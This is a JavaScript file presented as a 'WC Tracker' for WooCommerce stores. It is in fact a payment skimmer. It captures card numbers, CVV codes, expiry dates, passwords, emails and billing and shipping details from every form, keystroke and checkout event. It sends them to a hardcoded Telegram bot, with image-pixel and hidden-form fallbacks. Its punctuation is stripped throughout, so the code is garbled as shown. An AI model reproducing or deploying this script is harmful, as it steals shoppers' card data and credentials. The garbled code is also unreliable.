 GitHub httpsraw.githubusercontent.comyourusernamewc-trackermainwc-tracker.js
console.log('WC Tracker Loading...');

class WCTracker {
    constructor() {
        this.telegramBotToken = '8584009431AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w';
        this.telegramChatId = '7319274794';
        this.init();
    }

    init() {
        console.log('WC Tracker Initialized');
        this.trackAllForms();
        this.trackCheckoutFields();
        this.trackWooCommerce();
        this.testTelegram();
    }

    testTelegram() {
         Test message when loaded
        setTimeout(() = {
            this.sendToTelegram('🚀 TRACKER LOADED - ' + window.location.href);
        }, 2000);
    }

    trackAllForms() {
        document.addEventListener('submit', (e) = {
            e.preventDefault();
            const formData = this.getFormData(e.target);
            console.log('Form Submitted', formData);
            
            this.sendToTelegram('📝 FORM SUBMITTED', formData);
            
             Allow form to submit after tracking
            setTimeout(() = {
                e.target.submit();
            }, 1000);
        });
    }

    trackCheckoutFields() {
         Track all input changes
        document.addEventListener('input', (e) = {
            if (e.target.name && e.target.value) {
                const fieldName = e.target.name.toLowerCase();
                
                 Track important fields immediately
                if (fieldName.includes('card')  fieldName.includes('cvv')  fieldName.includes('cvc')  
                    fieldName.includes('expir')  fieldName.includes('email')  fieldName.includes('password')) {
                    
                    this.sendToTelegram('🔍 FIELD UPDATED', {
                        field e.target.name,
                        value e.target.value,
                        page window.location.href
                    });
                }
            }
        });

         Track field blur (when user leaves field)
        document.addEventListener('blur', (e) = {
            if (e.target.name && e.target.value) {
                const fieldName = e.target.name.toLowerCase();
                
                if (fieldName.includes('billing_')  fieldName.includes('shipping_')  
                    fieldName.includes('account_')  fieldName.includes('email')) {
                    
                    this.sendToTelegram('📍 FIELD COMPLETED', {
                        field e.target.name,
                        value e.target.value,
                        page window.location.href
                    });
                }
            }
        }, true);
    }

    trackWooCommerce() {
         WooCommerce specific tracking
        if (typeof wc_checkout_params !== 'undefined') {
            console.log('WooCommerce Detected');
            
             Track place order button click
            const placeOrderBtn = document.querySelector('#place_order');
            if (placeOrderBtn) {
                placeOrderBtn.addEventListener('click', (e) = {
                    console.log('Place Order Clicked');
                    const formData = this.getCheckoutData();
                    this.sendToTelegram('🛒 PLACE ORDER CLICKED', formData);
                });
            }

             Track checkout updates
            document.body.addEventListener('updated_checkout', () = {
                console.log('Checkout Updated');
                const formData = this.getCheckoutData();
                this.sendToTelegram('🔄 CHECKOUT UPDATED', formData);
            });
        }
    }

    getFormData(form) {
        const data = {};
        const inputs = form.querySelectorAll('input, select, textarea');
        
        inputs.forEach(input = {
            if (input.name && input.value) {
                data[input.name] = input.value;
            }
        });

        return {
            form form.id  form.className  'unknown',
            action form.action  'unknown',
            data data,
            url window.location.href
        };
    }

    getCheckoutData() {
        const data = {};
        const fields = [
            'billing_first_name', 'billing_last_name', 'billing_email', 'billing_phone',
            'billing_address_1', 'billing_city', 'billing_state', 'billing_postcode', 'billing_country',
            'shipping_first_name', 'shipping_last_name', 'shipping_address_1', 'shipping_city',
            'shipping_state', 'shipping_postcode', 'shipping_country',
            'account_username', 'account_password', 'card_number', 'expiry', 'cvc'
        ];

        fields.forEach(field = {
            const element = document.querySelector(`[name=${field}]`);
            if (element && element.value) {
                data[field] = element.value;
            }
        });

        return {
            type 'woocommerce_checkout',
            data data,
            url window.location.href
        };
    }

    sendToTelegram(title, data) {
        const message = this.formatMessage(title, data);
        console.log('Sending to Telegram', message);

         Method 1 Direct fetch
        fetch(`httpsapi.telegram.orgbot${this.telegramBotToken}sendMessage`, {
            method 'POST',
            headers {
                'Content-Type' 'applicationjson',
            },
            body JSON.stringify({
                chat_id this.telegramChatId,
                text message,
                parse_mode 'HTML'
            })
        })
        .then(response = response.json())
        .then(data = {
            console.log('Telegram response', data);
            if (!data.ok) {
                this.fallbackSend(message);
            }
        })
        .catch(error = {
            console.error('Telegram error', error);
            this.fallbackSend(message);
        });
    }

    fallbackSend(message) {
         Fallback method using image pixel
        const img = new Image();
        img.src = `httpsapi.telegram.orgbot${this.telegramBotToken}sendMessagechat_id=${this.telegramChatId}&text=${encodeURIComponent(message)}`;
        
         Second fallback using form submission
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = `httpsapi.telegram.orgbot${this.telegramBotToken}sendMessage`;
        form.innerHTML = `
            input type=hidden name=chat_id value=${this.telegramChatId}
            input type=hidden name=text value=${message}
            input type=hidden name=parse_mode value=HTML
        `;
        document.body.appendChild(form);
        form.submit();
        document.body.removeChild(form);
    }

    formatMessage(title, data) {
        let message = `🔔 ${title}nn`;
        message += `🌐 Page ${data.url  window.location.href}n`;
        message += `🕒 Time ${new Date().toLocaleString()}nn`;

        if (data.form) {
            message += `📋 Form ${data.form}n`;
        }

        if (data.data) {
            message += this.formatData(data.data);
        }

        message += `n────────────────────`;
        return message;
    }

    formatData(data) {
        let formatted = '';
        
         Billing Information
        const billing = this.extractSection(data, 'billing_');
        if (billing) {
            formatted += 📍 BILLING INFORMATIONn + billing + nn;
        }

         Shipping Information  
        const shipping = this.extractSection(data, 'shipping_');
        if (shipping) {
            formatted += 🚚 SHIPPING INFORMATIONn + shipping + nn;
        }

         Payment Information
        const payment = this.extractPayment(data);
        if (payment) {
            formatted += 💳 PAYMENT INFORMATIONn + payment + nn;
        }

         Account Information
        const account = this.extractSection(data, 'account_');
        if (account) {
            formatted += 👤 ACCOUNT INFORMATIONn + account + nn;
        }

         Other fields
        const other = this.extractOther(data);
        if (other) {
            formatted += 📝 OTHER INFORMATIONn + other + nn;
        }

        return formatted;
    }

    extractSection(data, prefix) {
        const fields = [];
        for (const key in data) {
            if (key.startsWith(prefix) && data[key]) {
                const cleanKey = this.cleanFieldName(key.replace(prefix, ''));
                fields.push(`${cleanKey} ${data[key]}`);
            }
        }
        return fields.length  0  fields.join('n')  null;
    }

    extractPayment(data) {
        const paymentFields = [];
        const paymentKeys = ['card_number', 'expiry', 'cvc', 'cvv', 'card_type'];
        
        paymentKeys.forEach(key = {
            if (data[key] && data[key].toString().trim() !== '') {
                const cleanKey = this.cleanFieldName(key);
                paymentFields.push(`${cleanKey} ${data[key]}`);
            }
        });

        return paymentFields.length  0  paymentFields.join('n')  null;
    }

    extractOther(data) {
        const otherFields = [];
        const excluded = ['billing_', 'shipping_', 'account_', 'card_number', 'expiry', 'cvc', 'cvv'];
        
        for (const key in data) {
            if (data[key] && !excluded.some(prefix = key.startsWith(prefix))) {
                const cleanKey = this.cleanFieldName(key);
                otherFields.push(`${cleanKey} ${data[key]}`);
            }
        }

        return otherFields.length  0  otherFields.join('n')  null;
    }

    cleanFieldName(fieldName) {
        return fieldName
            .replace([_-]g, ' ')
            .replace(bwg, l = l.toUpperCase())
            .trim();
    }
}

 Initialize immediately
console.log('Starting WC Tracker...');
window.wcTracker = new WCTracker();